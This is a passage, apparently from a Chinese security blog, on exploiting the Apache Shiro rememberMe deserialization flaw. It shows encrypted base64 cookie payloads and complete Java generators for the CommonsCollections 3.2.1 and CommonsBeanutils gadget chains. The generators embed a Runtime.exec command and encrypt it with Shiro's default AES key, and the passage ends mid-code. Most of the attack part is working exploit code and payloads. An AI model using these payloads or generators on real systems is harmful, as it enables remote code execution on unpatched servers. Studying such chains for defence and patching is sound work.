+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO<span class="hljs-regexp">/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmGvHx2OvJ5ryzYS4uJR8RbZqb6c5DVsaBAnzkILt1HEKgl0/</span>wuiDxWzHw<span class="hljs-regexp">/c7O253wUyl6/</span>YB5eQZbrDzNR4BuXcmSrLAn2cMPOo<span class="hljs-regexp">/f7FBNDZ6Gx+prKFPBZD5Suu4B6baLKZ0+qkOWyjOhshG2IVWEdIStW3eCfaLnYYSx24taYZmD+n+iARz4bwtsCThedKniGYlFWRYGbFYgSbtJuzwPXR5jJcIiS5miHlpdftHO9qPESGHYxD/</span>G9HodhwPGNb<span class="hljs-regexp">/PfRo5nTOXCCUohsJKvRPKU5R2AntvueGsQE51QPqU1xwRS6AlKNqCofMvvJI1Xgm29ah2brze3mZvOC/</span>oDvDzZ1fO<span class="hljs-regexp">/yF5VN0f8fcvIkML64xr85zeCyyb+Ozj4RVgIkWrud0cfqZDkagw3Q+bL/</span>C+N7L8jVH+EJDIqzhfiLKg5hAkBaS6Gq3X<span class="hljs-regexp">/BxPT80hEX/u</span>6ke6eedzfMwwi487NVb8uZpBlmNBY+l9K5Ml5ZBWN7e8ecziiswodwu0PX12Eq+wtHpIiUt5rpyHnbV0Wyk+oHvlICeBhdEXlrGcmCDJWpN<span class="hljs-regexp">/J8uWykd/</span><span class="hljs-number">4</span>rkXi192HWTmMaUV69sfBXxgV6461QX7fFbMxY5+MNfJzo78OXxZAkFA<span class="hljs-regexp">/R+xhALT3aP6TFPJKX1kEbP8lL/</span>D39FIDw+WLHezbGJpfPbT<span class="hljs-regexp">/1KIU7dY/</span>n6wqxJpq<span class="hljs-regexp">/B/</span>FNPNKn3bcZaa8uktCgrBq67j<span class="hljs-regexp">/+cd6y1k3V2Rt8uP7sK9pUMv5D9Xk32kzC0QTHYmLAXRIffY97am6nzWhE5yqmKGAm7Nom3Wmy2i2oY5dQGg/</span>D7DNY0Q15BplVWoOUDveB9az1g9GrF8ds4VAI7ZmCPwiz<span class="hljs-regexp">/7Q5lTa3CBAH00NWkauHe/i</span>Lqnw<span class="hljs-regexp">/injiwewoL8PA3fQv3R05lFC6LodL8PfKb1aEYWv8/</span>PcRqWcM4QFkI4+VrmsHpu7D3<span class="hljs-regexp">/QthiMkQCCMS/</span>VZjmtI2irReaLS9mlSlsa+p4mV5P6segENa7A5d6A5ov9hJ1oyGL7WGkaljvpEQrvbuu6gsPR2sw26e567iZtAsOv1j46MlYiAKBFMX4fR41ARzoIS<span class="hljs-regexp">/b2fVV/</span>Bi7+MYP7S<span class="hljs-regexp">/50xS5ynfqby3rmJPYe1uIoJFZhUvwvMWCcU+vQ5rnVD6vd4KNp1ULXNeS3Wd/</span>nZRWIKrpsDxyGZ8ZhFWxJh28IPXrL4VWjfeYnXlk7VlnZq4gp3JGHCm0MTo51Fy6Dpg9AdN5qlxIAsXWD6hTYWlMiuPNuIBQmUfePCG5vJA26lTFa2nRZB3Lwggj20s6QDIQ<span class="hljs-regexp">/cOLrLzZ49KvdefCasO/</span>o1tArOpfcVE+nC3WYBrcRVAC0jrlErBTNR7IW6wBdpSD0R24O9jWzBDsCmxkNEC+cN6Jn8J7<span class="hljs-regexp">/TzcrKHjnhimpNYZkC1X0epP8Xw3wWJbQOakrzYJIF9zEWBVdldFN9CrE8nbei/</span>MM<span class="hljs-regexp">/Xiywn6LOoLHdaiDQ5LhFA221wep1ek8gvzWI0QT8g+vvz6PdgrzThNhkFHGrYYt7h59owXNAJ6drLJHmQogsx0/</span>Fge0YZdAfr8MwpUVdUiNnxNe0IaKPKK1QZhVcD9VJfBW3hKUKV6ojeHW9QKhh0AMV/<span class="hljs-number">4</span>vZFs3VkkNJOVjr8TCEKZoW5m60pB0O5YhhOHGo=<br></code></pre></td></tr></table></figure>
+
+<p>可以成功执行</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250419165458208.png" srcset="/img/loading.gif" lazyload alt="image-20250419165458208"></p>
+<h3 id="CC3-2-1-攻击"><a href="#CC3-2-1-攻击" class="headerlink" title="CC3.2.1 攻击"></a>CC3.2.1 攻击</h3><p>需要 shiro 目标有 CommonsCollections3.2.1 依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这条链子是由 CC 系列的链条拼接得到的，主要就是要去掉 Transformer [] 这个数组，实现命令执行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC321Payload</span> &#123;<br>   	<span class="hljs-comment">// 生成恶意类字节码</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvil() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> ctClass.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>        evil.setSuperclass(ctClass.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime&quot;</span> +<br>                <span class="hljs-string">&quot;.AbstractTranslet&quot;</span>));<br>        evil.makeClassInitializer().insertBefore(cmd);<br>        <span class="hljs-keyword">return</span> evil.toBytecode();<br>    &#125;<br>    <span class="hljs-comment">// 反射设置字段值</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; clazz = obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-comment">// 生成恶意的Map类，作为gadget</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">gadGet</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setField(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getEvil()&#125;);<br>        setField(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;evil&quot;</span>);<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, templates);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(tiedMapEntry,<span class="hljs-string">&quot;lingx5&quot;</span>);<br>        setField(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>,invokerTransformer);<br>        lazyMap.remove(templates);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 序列化map gadget</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos).writeObject(gadGet());<br>        <span class="hljs-type">byte</span>[] CC321bytes = baos.toByteArray();<br><br>        <span class="hljs-comment">// AES加密</span><br>        <span class="hljs-type">byte</span>[] encryptKey = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(encryptKey, <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-comment">// 创建IV 随encrypt一起传输</span><br>        <span class="hljs-type">byte</span>[] IV = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">ivSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(IV);<br>        cipher.init(Cipher.ENCRYPT_MODE, key, ivSpec);<br>        <span class="hljs-type">byte</span>[] enEvilbytes = cipher.doFinal(CC321bytes);<br>        <span class="hljs-comment">// 拼接IV和加密后的CC321</span><br>        <span class="hljs-type">byte</span>[] IVandEncrypt = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[IV.length + enEvilbytes.length];<br>        System.arraycopy(IV, <span class="hljs-number">0</span>, IVandEncrypt, <span class="hljs-number">0</span>, IV.length);<br>        System.arraycopy(enEvilbytes, <span class="hljs-number">0</span>, IVandEncrypt, IV.length, enEvilbytes.length);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">IVandEncryptB64</span> <span class="hljs-operator">=</span> Base64.encodeToString(IVandEncrypt);<br>        System.out.println(IVandEncryptB64);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 模拟 shiro 的解密过程，反序列化验证</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-comment">// base64解码</span><br>        <span class="hljs-type">byte</span>[] IVandEncryptBytes = Base64.decode(IVandEncryptB64);<br>        <span class="hljs-comment">// 拆分IV和加密后的CC321</span><br>        <span class="hljs-type">byte</span>[] deIv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">byte</span>[] evil = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[IVandEncryptBytes.length - deIv.length];<br>        System.arraycopy(IVandEncryptBytes,<span class="hljs-number">0</span>,deIv,<span class="hljs-number">0</span>,deIv.length);<br>        System.arraycopy(IVandEncryptBytes,deIv.length,evil,<span class="hljs-number">0</span>,evil.length);<br>        cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);<br>        <span class="hljs-type">byte</span>[] deEvilBytes = cipher.doFinal(evil);<br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(deEvilBytes);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais).readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AAAAAAAAAAAAAAAAAAAAAItICRDL55PQ4M</span>+uF/<span class="hljs-number">0</span>QjIxmsxx8mwO0zL+cCUsm9HObVST6ifzXbe1pfVhnBOcNB/avKvCNhZKKEkw8li0SSbf62ZGen2JxK9GPNTlXi10BCSiCCjUZj2I2OccLu/h/iBFMCuLAaK+Qzr6jV6+n8rm8vAp3o7q2HqBXHvAtciY4ur4CJ356Mme5jrqdtaI++cjAuJgvjG3cRsWrMSooPDeAci0crfFK+<span class="hljs-number">3</span>Lj3yVUF1Hic+S2UG4nlsv9ixbN2kQ9h96YKRFwc+FVEtLlOyKCsf7cbvPwDlb8zQpfu9I5GlgAyBJ8HToAFRfx+Sc/sXdACA2nQail4+<span class="hljs-number">3</span>eEQ+P2avZI0VYatZ4+OJzNUiGmZPWpRvjlaBvMQ4ywEjndwP9d8Ye+tPXJoO8L9bWbXbNk46rBqlO1u4BF0GpEYqwCs88gaQWYwo/aVvajl5hdyY1vBh0/kK2R3WoQ9j4mEBHUVF9de203eoiO+DaWsxmvZkeqpAzdt1EkJ7t1uC1bswdrSmGizBnQcwNK2+<span class="hljs-number">6</span>AfRAXvq0ZRYNFWlY3o9rOEWrLX1ZKHbpqj8pJ9N8ikayN8rJwqWOElSs0hHBhEzUk5YzF5XhXpjR4ULmMThYBlQHLX+wk9VmuVQSeVXTXPJ7+vAzQLYkJvV0uJLjFno3A5rDykeW5MUUQJHUhxsrDg8OrfcX1IEx/<span class="hljs-number">3</span>QOAFIDFjDD9tlSiiGIixoeldxGhH7YRUXaBjl0Xa853SKns8fllBz2e1nPgFcJ/Yatw0Qhegy8g6uEZqZ7F8G1zF1gwPFHkdpQXKNgpWhxFZOkH/<span class="hljs-number">1</span>tXovTBZuaqbJ4syPirFodzUh/CH/<span class="hljs-number">7</span>e78Tpj0yQjCONfoBKTzkFAa1omWgVagR16OU6hiTzHbtaDvqFR1nxirVdR0H7JfD6aJ5yXpB/<span class="hljs-number">30</span>jbD4PQ6sBnNzoR5ojD/ioAWi3CIqhW2Jugl0XIiPQDLWdWwPm5A4xbgGjjZ4DoBAwNQum7zDAE/ebRDtCm8hRMLXuV8k/ol+icErvIKxn8P624MnaSbJLA6scXKEdKXpk2yvnbksKnHQQi8+KyVDDEUpOrahJDA2miMRZ/<span class="hljs-number">2</span>VfOvrdxJVfkFsEiQvgYOfetu8gFTkSFTaNMFm7i/YTbgtBbb7o73w6E54Ma+W8Q4AQxz3Fcf7QozyPYbF2vEb0sGsGi2RwzRUy1mAW2+<span class="hljs-number">01</span>ZwYt4JCIkfu6nfRVusLUr44AjuqbTuR+fkOdIu4vBwZfh0cFbhM8KrvoQP7QKl7dKPkbbfiNiQ7dd/RClsP5s7XqE87fyCD0eI5p8e1FkUIgOfJfG0wUZqYwyG17u2v94lR1eLoxxLK5L2xoB+<span class="hljs-number">6</span>QrwFbRb+ccn4Gg6356YAgXL19XXCSR//<span class="hljs-number">2</span>G+<span class="hljs-number">8</span>aiYXAcTHZ4YaD+vTdDNFhqWztTakdfyGVihkFJIZKhchjhW2nSs5sx4ZjqEOVbpwL1ycsPxmf+blgZGOkGs/jzrK17XhQTqzSMg3UCdI4N1PHFwxUW29RH2aOsL4z/<span class="hljs-number">7</span>VHQBpiBj5doFYtPNpxRfuo4HREJvMT7ApfhPiGPdla573/yooJy7iLqeg5kEYo+<span class="hljs-number">3</span>PJ0FuLHmpwAky78IH29a/dIQIOn3fSa/CrbtgwkiQPGhtuLY2js1qkMHDiveiytMVGtYgMjfe/QHhaZG0+Dtv1ivKsR9SBANl3AC0sGxiDLW3+uhoqQOvPtP1+hE9gzd+pnl1eLLZ5eZ2ptFAXlf12wDDc73PiXIVHcifLuU7B5USkOGmG/XLDwJkhSDFvNcWbw3RjcgE=<br></code></pre></td></tr></table></figure>
+
+<p>可以攻击成功</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250420153552612.png" srcset="/img/loading.gif" lazyload alt="image-20250420153552612"></p>
+<h3 id="CB-链攻击"><a href="#CB-链攻击" class="headerlink" title="CB 链攻击"></a>CB 链攻击</h3><p>shiro 默认是带了 commons-beanutils 依赖的</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250420155140387.png" srcset="/img/loading.gif" lazyload alt="image-20250420155140387"></p>
+<p>所以这条链更加通用</p>
+<p>保证依赖版本一直</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.time.temporal.Temporal;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvil() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> ctClass.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>        evil.setSuperclass(ctClass.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        evil.makeClassInitializer().insertBefore(cmd);<br>        <span class="hljs-keyword">return</span> evil.toBytecode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">gadGet</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setField(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getEvil()&#125;);<br>        setField(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;evil&quot;</span>);<br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, beanComparator);<br>        setField(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        setField(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,<span class="hljs-string">&quot;lingx5&quot;</span>&#125;);<br>        <span class="hljs-keyword">return</span> priorityQueue;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 序列化CB链</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos).writeObject(gadGet());<br>        <span class="hljs-type">byte</span>[] CBbytes = baos.toByteArray();<br>        <span class="hljs-comment">// AES加密</span><br>        <span class="hljs-type">byte</span>[] encryptKey = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span 